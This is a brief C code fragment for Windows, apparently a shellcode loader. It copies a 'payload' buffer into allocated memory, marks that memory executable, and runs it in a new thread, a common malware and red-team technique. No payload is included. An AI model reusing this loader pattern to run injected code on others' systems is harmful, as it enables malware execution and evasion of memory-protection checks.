PVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);
DWORD proc = 0;
BOOL bExecute = VirtualProtect(pWorkBuffer, sPayloadSize, PAGE_EXECUTE_READ, &proc);
HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pWorkBuffer, 0, 0, 0);
WaitForSingleObject(hThread, -1);